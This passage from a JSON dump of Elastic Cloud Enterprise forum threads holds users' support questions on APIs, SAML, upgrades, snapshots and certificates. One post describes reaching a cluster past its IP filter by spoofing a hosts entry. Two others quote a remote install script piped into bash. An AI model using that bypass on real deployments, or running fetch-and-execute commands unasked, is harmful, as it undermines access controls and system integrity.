    ],
    "author": "logger",
    "date": "October 31, 2019, 9:33pm October 29, 2019, 4:34pm October 29, 2019, 4:44pm October 29, 2019, 5:32pm October 29, 2019, 6:25pm October 30, 2019, 6:49am October 31, 2019, 7:26pm November 14, 2019, 7:26pm",
    "body": "Hi there, I am currently trying to script a few things for our ECE. Right now I am hurdling with the API for IP-filtering. curl -k -X GET -H \"Authorization: Bearer mytoken\" https://localhost:12443/api/v1/deployments/ip-filtering/rulesets { \"rulesets\": } I have a few rulesets created via the UI and I am able to put it manually to the deployments. But I need to script it. Is there a bug or am I doing it wrong. Greetings Malte",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "807cb4b5-a985-45a6-83f6-5b6e99bb54c8",
    "url": "https://discuss.elastic.co/t/proxy-forwarder-security-issue/205082",
    "title": "Proxy / Forwarder security issue",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "robrotheram",
    "date": "October 24, 2019, 1:55pm October 24, 2019, 4:07pm October 24, 2019, 9:09pm October 24, 2019, 9:22pm October 24, 2019, 9:23pm November 7, 2019, 9:23pm",
    "body": "Hi I am trialing ECE and I have setup secure route to a new cluster and that works fine. I get a access denied when I try and access it from anywhere except the host I allowed. But I can hit the frc-services-forwarders-services-forwarder (port 9244) on a server that is only a allocator. If I spoof the address for the cluster ie. add the cluster-id.ece-address.local to the allocator ip in the host file I can access the cluster anywhere I do this change. This raise some security concerns, also that communication looks to be frc-services-forwarders-services-forwarder http only. Does the poxy terminate the tls connection and its http to the elasticsearch cluster or is the something missing.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "e128e557-c07f-48f2-9625-a02ed979039a",
    "url": "https://discuss.elastic.co/t/kibana-no-instances-running/204263",
    "title": "Kibana - No Instances Running",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "justinw",
    "date": "October 18, 2019, 6:12pm October 18, 2019, 6:37pm October 18, 2019, 6:48pm October 18, 2019, 9:05pm October 18, 2019, 9:23pm October 18, 2019, 9:32pm October 21, 2019, 2:30pm October 24, 2019, 8:08pm November 7, 2019, 8:08pm",
    "body": "Hi, All of a sudden my kibana deployment disappeared. There's not much info in the UI - has anyone seen this before? Any tips on resolution? I have terminated the deployment, re-created it, tried scaling up to more nodes, and more, however each time ends up in a failed kibana deployment. Screenshot from 2019-10-18 10-45-14.png1898×946 75.3 KB Thanks, Justin",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "15a2805a-944a-4e43-9327-e416df512499",
    "url": "https://discuss.elastic.co/t/does-ece-have-user-audit-trail/204435",
    "title": "Does ECE have user audit trail",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "robrotheram",
    "date": "October 21, 2019, 10:27am October 21, 2019, 2:25pm October 21, 2019, 3:08pm October 21, 2019, 4:27pm October 21, 2019, 7:01pm October 22, 2019, 10:51am October 22, 2019, 12:44pm October 22, 2019, 12:46pm November 5, 2019, 12:46pm",
    "body": "Hello, I am experimenting with ECE and I trying to see if the admin console stores a audit trail of user actions. I can see the activity field but there is no user attribute. What I am looking for is something like \"User A performed cluster restart on deployment \" so we can work out which user did which action. Secondly is there a way I can export this data?",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "457cc6d3-5b21-43a0-bee7-486e0352676d",
    "url": "https://discuss.elastic.co/t/monitor-status-of-filebeat-sin-elastic-cloud/203429",
    "title": "Monitor Status of Filebeat sin elastic cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "AndresL",
    "date": "October 14, 2019, 10:31am October 22, 2019, 10:01pm October 28, 2019, 2:57pm",
    "body": "Hi, how can i know the status of Filebeats across my organization in an elastic cloud deployment? Checking into the documentation, looks like is for hosted cluster.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "995aa517-ee5e-4b70-a7ed-1f8cc99098fe",
    "url": "https://discuss.elastic.co/t/resubscribe-alerting-email/201912",
    "title": "Resubscribe alerting email",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "October 2, 2019, 9:14am October 2, 2019, 4:33pm October 16, 2019, 4:40pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "01cfc2b6-faf1-4fce-a778-b66207e72efa",
    "url": "https://discuss.elastic.co/t/kibana-will-not-take-saml-config-changes-in-the-user-settings-overrides/202002",
    "title": "Kibana will not take SAML config changes in the User Settings Overrides",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ryan_Downey",
    "date": "October 2, 2019, 4:13pm October 2, 2019, 4:29pm October 16, 2019, 4:29pm",
    "body": "I have a deployment that will not take the SAML settings that I'm trying to implement. I have tried to implement the Kibana settings needed to allow SAML access and the changes fail every time. This is occurring on another deployment as well. Out of the three deployments that I've tried to implement SAML access to only one has taken the changes and allows SAML access. There was a problem applying this configuration change [rolling-upgrade]: [java.lang.IllegalStateException: The state did not become the desired one before [600000 milliseconds] elapsed. Last error was: [Instance is not running [instance-0000000016]. Please check allocator/docker logs.]] { \"cluster_topology\": [ { \"instance_configuration_id\": \"kibana\", \"size\": { \"resource\": \"memory\", \"value\": 4096 }, \"zone_count\": 2 } ], \"kibana\": { \"system_settings\": { \"elasticsearch_password\": \"xxxxxx\", \"elasticsearch_url\": \"xxxxxx\", \"elasticsearch_username\": \"found-internal-kibana4-server\" }, - \"user_settings_yaml\": \"# Note that the syntax for user settings can change between major versions.\\n# You might need to update these user settings before performing a major version upgrade.\\n#\\n# Use OpenStreetMap for tiles:\\n# tilemap:\\n# options.maxZoom: 18\\n# url: http://a.tile.openstreetmap.org/{z}/{x}/{y}.png\\n#\\n# To learn more, see the documentation.\\n#xpack.security.authc.providers: [saml, basic]\\n#xpack.security.authc.saml.realm: saml1\\n#server.xsrf.whitelist: [/api/security/v1/saml]\\n#xpack.security.authProviders: [saml, basic]\\n#server.xsrf.whitelist: [/api/security/v1/saml]\\n#xpack.security.public:\\n# protocol: https\\n# hostname: xxxxxx\\n# port: 9243\\n#\\nxpack.ilm.enabled: true\\n#\\n#xpack.security.authProviders: [saml, basic]\\n#server.xsrf.whitelist: [/api/security/v1/saml]\\n#xpack.security.public:\\n# protocol: https\\n# hostname: xxxxxx\\n# port: 9243\", + \"user_settings_yaml\": \"# Note that the syntax for user settings can change between major versions.\\n# You might need to update these user settings before performing a major version upgrade.\\n#\\n# Use OpenStreetMap for tiles:\\n# tilemap:\\n# options.maxZoom: 18\\n# url: http://a.tile.openstreetmap.org/{z}/{x}/{y}.png\\n#\\n# To learn more, see the documentation.\\n#xpack.security.authc.providers: [saml, basic]\\n#xpack.security.authc.saml.realm: saml1\\n#server.xsrf.whitelist: [/api/security/v1/saml]\\n#xpack.security.authProviders: [saml, basic]\\n#server.xsrf.whitelist: [/api/security/v1/saml]\\n#xpack.security.public:\\n# protocol: https\\n# hostname: xxxxxx\\n# port: 9243\\n#\\nxpack.ilm.enabled: true\\n#\\nxpack.security.authProviders: [saml, basic]\\nserver.xsrf.whitelist: [/api/security/v1/saml]\\nxpack.security.public:\\n protocol: https\\n hostname: xxxxxx\\n port: 9243\", \"version\": \"7.3.0\" }, \"transient\": { \"strategy\": { \"rolling\": {} } } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "65f6c12f-379f-4917-8ecc-931c80702e02",
    "url": "https://discuss.elastic.co/t/ece-saml-error-still-persists-after-upgrade/188104",
    "title": "ECE Saml Error still persists after upgrade",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "afuggetta",
    "date": "June 28, 2019, 8:22pm July 1, 2019, 12:57pm July 8, 2019, 2:20pm July 8, 2019, 2:37pm July 8, 2019, 2:44pm July 9, 2019, 1:05pm July 23, 2019, 1:05pm October 1, 2019, 8:58pm",
    "body": "Hi @Alex_Piggott, I saw that ECE 2.2.3 came out and it had a SAML bug fix. However, after upgrading I still see the same error as explained in here: ECE - SAML integration error . Any suggestions? Thanks, Andrea",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "5e7d2431-ed8c-41d0-9363-5eec0716a694",
    "url": "https://discuss.elastic.co/t/disable-elastic-security-plugin-in-ece/201650",
    "title": "Disable Elastic Security Plugin in ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "robrotheram",
    "date": "September 30, 2019, 1:47pm September 30, 2019, 2:15pm September 30, 2019, 2:46pm October 14, 2019, 2:46pm",
    "body": "Hi, I am trialing out ECE and we have a our own custom plugin that implements the rest filter class. This is incompatible with elastic security plugin since it seems that only one plugin can implement the rest filter class. In our clusters we just disable the plugin and run the cluster in its own VLAN can we do this in ECE",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3564d862-a8c9-4a98-8dd0-570faf54eddc",
    "url": "https://discuss.elastic.co/t/endpoints-on-elastic-cloud/200672",
    "title": "Endpoints on Elastic Cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "AndresL",
    "date": "September 23, 2019, 11:31am September 23, 2019, 1:22pm September 23, 2019, 1:54pm September 23, 2019, 2:34pm September 23, 2019, 2:54pm September 23, 2019, 3:39pm September 23, 2019, 3:39pm September 23, 2019, 4:02pm October 7, 2019, 4:02pm",
    "body": "HI, i just deployed a cluster in ECE. Im trying to edit the settings for and endpoint following this instructions: https://www.elastic.co/guide/en/cloud-enterprise/current/ece-administering-endpoints.html But i cant see any of this; From the Platform menu, select Settings . Specify the CNAME value for your cluster and Kibana endpoints. Click Update Deployment endpoints . The new endpoint becomes effective immediately.",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "512e5d59-8aa1-487a-a293-324592735773",
    "url": "https://discuss.elastic.co/t/ece-installation-script-error/200288",
    "title": "ECE Installation script error",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rajuleo",
    "date": "September 19, 2019, 6:21pm September 22, 2019, 4:28pm September 23, 2019, 7:09am October 7, 2019, 7:09am",
    "body": "Hi Team, While running the installation bash script, I am getting below error? any insight? bash-4.2$ bash <(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) install Elastic Cloud Enterprise Installer Start setting up a new Elastic Cloud Enterprise installation by installing the software on your first host. This first host becomes the initial coordinator and provides access to the Cloud UI, where you can manage your installation. To learn more about the options you can specify, see the documentation. NOTE: If you want to add this host to an existing installation, please specify the --coordinator-host and --roles-token flags -- Verifying Prerequisites -- Checking runner container does not exist... Errors have caused Elastic Cloud Enterprise installation to fail Error while fetching server API version: ('Connection aborted.', PermissionError(13, 'Permission denied'))",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fa29df0a-38c1-40bc-b471-6d175837705f",
    "url": "https://discuss.elastic.co/t/elastic-cloud-enterprise-setup-for-exisiting-elk-solution/200180",
    "title": "Elastic Cloud Enterprise setup for exisiting ELK solution",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rajuleo",
    "date": "September 19, 2019, 10:34am September 19, 2019, 2:17pm October 3, 2019, 2:17pm",
    "body": "Hi Team, We already have a ELK solution running in our environment for Log analytics, If we need to use Elastic Cloud Enterprise setup basically the Cloud UI self service portal for the existing solution, is it supported, Can ECE discover the existing ELK deployment and start managing it?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "78a484d0-7e4e-4391-b598-dc7ceb9a3349",
    "url": "https://discuss.elastic.co/t/resync-runner-doesnt-appear-to-do-anything/199883",
    "title": "Resync runner doesn't appear to do anything",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ClydeM",
    "date": "September 17, 2019, 8:59pm October 1, 2019, 9:00pm",
    "body": "Continuing the discussion from ECE Cloud UI shows incorrect info of node roles: I ran into this issue. I tried running a resync on the runner and it doesn't help any. Add/remove a role didn't help either",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "16d33b91-4d30-49ec-be95-24b8602d8960",
    "url": "https://discuss.elastic.co/t/docker-updates-causing-issues-with-the-ece/198131",
    "title": "Docker Updates Causing Issues with the ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "daniel_a",
    "date": "September 5, 2019, 1:10am September 6, 2019, 3:12pm September 9, 2019, 1:58am September 9, 2019, 12:43pm September 16, 2019, 10:18am September 16, 2019, 5:43pm September 30, 2019, 5:43pm",
    "body": "I noticed connection issues with the ECE after Google updated docker to its latest version \"Docker version 19.03.2, build\", and right after that everything in the ECE has stopped working. I can still log into the UI, but nothing else is showing up. I'm getting a few errors while clicking on things from the left side menu, nothing is populating though: -> There was a problem communicating with the system cluster. Origin status code [502 Bad Gateway]. -> Fetching region ece-region failed",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "f35316cc-5fa4-4bfb-87f7-70a034e4d648",
    "url": "https://discuss.elastic.co/t/using-python-to-connect-to-elastic-cloud/199350",
    "title": "Using Python to Connect To Elastic Cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "michaelberg",
    "date": "September 13, 2019, 3:31am September 13, 2019, 5:37am September 13, 2019, 1:49pm September 13, 2019, 2:17pm September 13, 2019, 2:34pm September 27, 2019, 2:34pm",
    "body": "Greetings Everyone! I am building a project for University and want to do some experimenting with connecting to Elastic Cloud using Python ... I already have Elastic Cloud and Kibana set up and it's working perfectly well and ingesting data from a couple of different servers I'm running ... I am having a hard time finding documentation that outlines the steps you need to take in order to create whatever certificates you need to connect securely from Python code and then, I think, you need to upload those to the cloud platform and install them locally as well on the machine you'll be connecting \"from\" ... Not looking for someone to \"hand hold\" but perhaps kick me in the right direction for where to find some good documentation on what needs to be done to make this connection! I appreciate any and all advice/direction I can get! Thanks so much!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "13e6bf93-ff08-4ae3-8fc4-d544b4da10d3",
    "url": "https://discuss.elastic.co/t/snapshot-recovery-on-a-separate-ece-setup/199353",
    "title": "Snapshot Recovery on a Separate ECE Setup",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "September 13, 2019, 3:39am September 13, 2019, 1:23pm September 27, 2019, 1:23pm",
    "body": "I have an ECE 2.3 setup which has gone down due to a damaged zookeeper. Because of this, I set up a new ECE and created a couple of new ES cluster deployments on the new ECE, also on version 2.3. How do I restore data from the previous deployments to the new ES clusters on the new ECE? On the Snapshot recovery UI, I am only able to select from deployments created on the new ECE and not from the previous one. The snapshots are stored on Minio.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9fe32808-be71-4d5f-979c-9ab2f5c46cbb",
    "url": "https://discuss.elastic.co/t/installing-custom-driver-on-cloud/199339",
    "title": "Installing custom driver on cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "September 13, 2019, 12:37am September 14, 2019, 7:11am September 27, 2019, 12:51pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "df510509-7a00-42de-8345-7332094102f8",
    "url": "https://discuss.elastic.co/t/filebeat-modules-elastic-cloud/197906",
    "title": "Filebeat modules + Elastic Cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "gerard1",
    "date": "September 3, 2019, 4:22pm September 3, 2019, 6:30pm September 12, 2019, 2:18pm September 26, 2019, 2:18pm",
    "body": "I'm following the official documentation to try out Filebeat modules, together with Elastic Cloud, but I'm getting this error when generating some log files. filebeat | 2019-09-03T16:18:31.368Z ERROR elasticsearch/client.go:343 Failed to perform any bulk index operations: 500 Internal Server Error: {\"error\":{\"root_cause\":[{\"type\":\"illegal_state_exception\",\"reason\":\"There are no ingest nodes in this cluster, unable to forward request to an ingest node.\"}],\"type\":\"illegal_state_exception\",\"reason\":\"There are no ingest nodes in this cluster, unable to forward request to an ingest node.\"},\"status\":500} That I'm missing?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "81a10ad0-f583-4554-97db-6c14e40dcf42",
    "url": "https://discuss.elastic.co/t/ldap-resultcode-89-simple-bind-operations-are-not-allowed-to-contain-a-bind-dn-without-a-password/198919",
    "title": "Ldap resultCode=89 Simple bind operations are not allowed to contain a bind DN without a password",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "September 10, 2019, 2:50pm September 11, 2019, 5:41am September 11, 2019, 1:59pm September 12, 2019, 9:43am September 26, 2019, 9:43am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "df1c997e-092f-4d67-be6b-e89faa408a37",
    "url": "https://discuss.elastic.co/t/ece-role-based-access-control/198286",
    "title": "ECE role-based access control",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ippolito",
    "date": "September 5, 2019, 3:47pm September 5, 2019, 5:54pm September 19, 2019, 6:01pm",
    "body": "All - I'm trying to script putting an allocator into maintenance mode, but I don't want to use platform admin privileges. I read this document: https://www.elastic.co/guide/en/cloud-enterprise/current/ece-configure-rbac.html which says \"there are several pre-built roles,\" implying you might be able to customize access control. But I see no way to do that. Wondering if there's a way to grant a user only the permission to put a node into maintenance mode (and to take it back out again). Thanks in advance, Mike",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f3871b4f-ee5d-468f-811d-55f8288f6c41",
    "url": "https://discuss.elastic.co/t/ece-online-training/196331",
    "title": "ECE Online Training",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "sparcs07",
    "date": "August 22, 2019, 1:30pm August 22, 2019, 1:44pm August 22, 2019, 3:51pm August 27, 2019, 6:34pm September 10, 2019, 6:34pm",
    "body": "Hi I am having issues with the ECE online training, where I have been told to post the issue here. Step 17 , fails to work so I can not access kibana. I have rerun this process a few times. I note after restart sometimes the IP Address changes so maybe something in that. Help .",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "98fb38e3-2146-4212-b8ed-27ef617a5c58",
    "url": "https://discuss.elastic.co/t/elastic-cloud-licensing/196858",
    "title": "Elastic Cloud Licensing",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rwatts3",
    "date": "August 27, 2019, 1:45am August 27, 2019, 4:37am August 27, 2019, 4:37am September 10, 2019, 4:37am",
    "body": "Greetings Does elastic cloud include licensing ?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "57f0e15d-7c09-4e8b-bd6c-f78e4f1808ec",
    "url": "https://discuss.elastic.co/t/certificate-added-via-gui-only-distributed-to-2-of-3-nodes/195916",
    "title": "Certificate added via GUI only distributed to 2 of 3 nodes",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "logger",
    "date": "August 20, 2019, 11:59am August 20, 2019, 12:19pm August 20, 2019, 1:23pm August 20, 2019, 1:47pm August 20, 2019, 1:52pm August 20, 2019, 2:37pm September 3, 2019, 2:37pm",
    "body": "Hi there, we have created a 3 node ECE Cluster. Almost everything is working fine. Except the certificates. We have created the pem as described in the documentation and uploaded it via the GUI in Platform -> Settings I realized that the node had still the precalculated elastic certificate. But after I tried logging in via the other nodes everything worked. Except for the first node. It has still the old cert. When I look into the certificate chain via the browser it shows me the right Information but my browser does not like it. Maybe you can help. Greetings Malte",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "a5993ea6-0672-4e6f-8d70-e91b4bc18934",
    "url": "https://discuss.elastic.co/t/ece-upgrade-step/195539",
    "title": "ECE Upgrade Step",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ryan_Downey",
    "date": "August 16, 2019, 5:53pm August 16, 2019, 6:08pm August 16, 2019, 6:14pm August 30, 2019, 6:14pm",
    "body": "ECE 2.2.2 - RPM I've read through the documentation on upgrading ECE but have a few questions. Docs: https://www.elastic.co/guide/en/cloud-enterprise/current/ece-upgrade.html Looking to upgrade from 2.2.2 to 2.3 due to the fact that we would like to implement SAML and allow our users to access their Kibana instances easily. From what I understand 2.2.2 had a bug that hindered SAML via https. Installation steps: Backup transition logs. I believe this refers to zookeeper.log in our apps/data/elastic/<RUNNER_ID>/services/zookeeper/logs folder with zookeeper.log being the file to backup but some clarification on that would be appreciated. Change to a user that belongs to the docker group. Configure Elastic Cloud Enterprise to perform the individual container upgrades by creating a frc-upgraders-upgrader container on each host that is part of the installation. I did a bit of docker research and it seems like docker create -name frc-upgraders-upgrader would be the command to create this. Create this container on all 15 of our host or just the directors? Seems like all 15 would be the correct answer. Download and run the latest installation script with the upgrade action on a single host that holds the director role: bash <(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) upgrade Add Elastic Stack packs. Upgrade the system deployments if needed. Ours are at 6.6.2 so it seems like they are on the right version. Appreciate any insight and recommendations.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1278fa56-756c-4dfd-9014-4d6287af771a",
    "url": "https://discuss.elastic.co/t/redhat-openshift-fluentd-to-ece-connection-configuration/195230",
    "title": "RedHat OpenShift fluentd to ECE connection configuration",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ryan_Downey",
    "date": "August 15, 2019, 3:32pm August 14, 2019, 3:47pm August 14, 2019, 4:11pm August 14, 2019, 4:53pm August 14, 2019, 5:34pm August 15, 2019, 3:43pm August 15, 2019, 3:45pm August 15, 2019, 3:49pm August 29, 2019, 3:49pm",
    "body": "Does anyone have any experience with getting OpenShift thats using fluentd as an ingest pipeline processor to connect to ECE? Since fluentd is very similar to logstash I have a logstash config that is working, in that it can ship beat data from my computer to logstash and connect to the ECE cluster, but we cant get the fluentd settings to work. Heres our logstash config that were trying to mirror for fluentd. input { beats { port => 5044 } } output { elasticsearch { hosts => [\"https://xxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxx.xx.gov:443\"] manage_template => false index => \"%{[@metadata][beat]}-%{[@metadata][version]}\" user => \"logstash\" password => \"<redacted>\" ssl => true #ssl_certificate_verification => false cacert => \"/etc/logstash/globalcert/root_ca_pub.pem\" } } We've manually tested our cert and it works but were missing something in our fluentd config or have an extra setting.",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "e4f46fd8-89ce-4541-a34e-116e1e213758",
    "url": "https://discuss.elastic.co/t/cannot-migrate/195337",
    "title": "Cannot migrate",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Aymen_Ben_Moussa",
    "date": "August 15, 2019, 11:54am August 15, 2019, 12:23pm August 29, 2019, 12:23pm",
    "body": "I have a Elasticsearch instance running on AWS under EU paris, i'm trying to migrate my instance to elastic cloud but i found out there is not EU paris region in the elastic cloud and therefore i can not migrate ? is there something i can do ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b5feaa2b-0f4f-4310-8cc1-3cd88938de71",
    "url": "https://discuss.elastic.co/t/how-to-disconnect-runner-before-deleting-it/194065",
    "title": "How to disconnect runner before deleting it?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "daniel_a",
    "date": "August 6, 2019, 4:56pm August 6, 2019, 5:20pm August 6, 2019, 5:32pm August 6, 2019, 5:33pm August 20, 2019, 5:34pm",
    "body": "I'm trying to delete a runner, but the delete button in the platform is grayed out, and it shows the following message: \"Disconnect this runner before deleting it.\" I can't find how to disconnect a runner in the ECE documentation either. https://www.elastic.co/guide/en/cloud-enterprise/current/Platform_-_Runners.html#ece-request_218 Can I just run a delete command to delete it?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2733ec42-8219-4c4f-941f-c0cbc14faa0c",
    "url": "https://discuss.elastic.co/t/where-should-i-move-proxy-nodes-in-ece/193860",
    "title": "Where should I move proxy nodes in ECE?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "daniel_a",
    "date": "August 5, 2019, 5:54pm August 5, 2019, 6:58pm August 5, 2019, 8:12pm August 5, 2019, 8:00pm August 5, 2019, 9:00pm August 5, 2019, 9:02pm August 5, 2019, 10:55pm August 5, 2019, 10:58pm August 5, 2019, 11:05pm August 6, 2019, 12:50pm August 6, 2019, 4:07pm August 20, 2019, 4:07pm",
    "body": "I just noticed Kibana was kind of slow in my current deployment, and I wasn't sure why. Maybe, I should have moved proxy nodes from coordinators to allocators. Any thoughts? If I don't want to deploy a dedicate node/s for proxies, where should I keep proxies in the ECE deployment? Should I move them to allocators or should they stay as they are (on coordinators)? I was under impression that nothing should have been moved into allocators for the security reasons. --Thanks",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "5821dc56-a369-45fa-b707-2a461ac9a04e",
    "url": "https://discuss.elastic.co/t/how-to-authenticate-against-v0-1-rest-api-in-ece/192224",
    "title": "How to Authenticate against v0.1 Rest API in ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "seizste",
    "date": "July 25, 2019, 10:55am July 25, 2019, 11:08am August 4, 2019, 3:01pm August 18, 2019, 3:01pm",
    "body": "Continuing the discussion from Reset Elasticsearch Deployment Passsword using API: Finally got time to implement this, but looks like authentication to a v0.1 endpoint is a bit different then to the v1.0 APIs in ECE. As far as i can tell a bearer authentication token is required but how do i get such a token if i \"only\" have the admin user and pw for the elastic cloud enterprise cloudui / api.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "09c02b46-881a-48d8-800c-c88abc5afc26",
    "url": "https://discuss.elastic.co/t/ece-kibana-logo-replacement-or-addition-of-container-name-text/193399",
    "title": "ECE Kibana Logo replacement or addition of container name text",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ryan_Downey",
    "date": "August 1, 2019, 7:42pm August 1, 2019, 8:03pm August 2, 2019, 1:20pm August 16, 2019, 1:21pm",
    "body": "I did a little bit of research on changing the logo in Kibana but everything seems to have been implemented on Elastic and not ECE. How much might the directions for a logo change be different within ECE? I'm also looking at adding text to the top navbar that would have the deployment name for easy identification instead of changing the logo. Interested in the communities thoughts.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f98ef3b2-3c7d-4c11-9837-dd5df3e67621",
    "url": "https://discuss.elastic.co/t/stack-access-audit/191817",
    "title": "Stack access audit",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "July 23, 2019, 12:58pm July 29, 2019, 3:18pm July 31, 2019, 4:40am August 14, 2019, 4:40am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "96ada350-e00a-43f3-97b8-fa8cb5248147",
    "url": "https://discuss.elastic.co/t/removing-failed-ece-deployments-in-cloud-ui/192931",
    "title": "Removing failed ECE deployments in Cloud UI",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ryan_Downey",
    "date": "July 30, 2019, 3:09pm July 30, 2019, 3:22pm July 30, 2019, 4:01pm July 30, 2019, 6:28pm July 30, 2019, 6:28pm August 13, 2019, 6:37pm",
    "body": "ECE 2.2 Issue: I have two deployments showing in the Cloud UI that are stuck in the \"Deployment Not Found\" stage and I'm trying to clarify how to clear them out correctly. From what I understand of the post linked below I should log in to one of my Coordinator nodes and run two commands since I dont have access to the API console. 1 `curl -XPOST -u 'admin:PASS' 'localhost:12400/api/v1/clusters/elasticsearch/ID/_shutdown?skip_snapshot=true'` 2 `curl -XDELETE -u 'admin:PASS' 'localhost:12400/api/v1/clusters/elasticsearch/ID` The API reference table has some minor syntax changes but this seems like the general route that I need to take to remove them from the Cloud UI. Failed attempts to create a deployment Elastic Cloud Enterprise ECE 2.0.0 Failed attempts to create a deployment result in a failed cluster showing in the list of deployments that cannot be removed. The deployment shows the following status: Deployment health issues: Some instances in the deployment are unhealthy The latest attempt to change the configuration failed When looking at the ECE Cloud UI, the node appears under the allocator with a Red X and the version is showing 'v'. However, when logging into the OS on the allocator the node is not showi…",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "66e7e053-1bb9-4439-9482-52026a12d839",
    "url": "https://discuss.elastic.co/t/cloud-isnt-restoring-from-snapshot/192491",
    "title": "Cloud isn't restoring from snapshot",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "seanziee",
    "date": "July 26, 2019, 7:03pm July 29, 2019, 3:09pm July 29, 2019, 6:12pm July 29, 2019, 6:18pm July 29, 2019, 6:38pm July 29, 2019, 7:08pm July 29, 2019, 7:23pm August 12, 2019, 7:23pm",
    "body": "This is a pretty basic use case, don't know how this isn't caught yet in testing, but I can't bring a snapshot I have over because of the .kibana index (and .apm-*) which come default on the new instance. I have 100's of indices to import so I also can't manually pull in each one that I need. So then my only option is to write out all 300 indices manually, excluding the .kibana index. Am I missing something? failed to restore snapshot java.lang.IllegalStateException: index and alias names need to be unique, but the following duplicates were found [.kibana (alias of [.kibana_1/k-nvOLVkSp-gKDdnJ227RQ])] at org.elasticsearch.cluster.metadata.MetaData$Builder.build(MetaData.java:1212) ~[elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.ClusterState$Builder.metaData(ClusterState.java:703) ~[elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.snapshots.RestoreService$1.execute(RestoreService.java:418) ~[elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.ClusterStateUpdateTask.execute(ClusterStateUpdateTask.java:47) ~[elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.MasterService.executeTasks(MasterService.java:687) ~[elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.MasterService.calculateTaskOutputs(MasterService.java:310) ~[elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.MasterService.runTasks(MasterService.java:210) [elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.MasterService$Batcher.run(MasterService.java:142) [elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.TaskBatcher.runIfNotProcessed(TaskBatcher.java:150) [elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.TaskBatcher$BatchedTask.run(TaskBatcher.java:188) [elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:688) 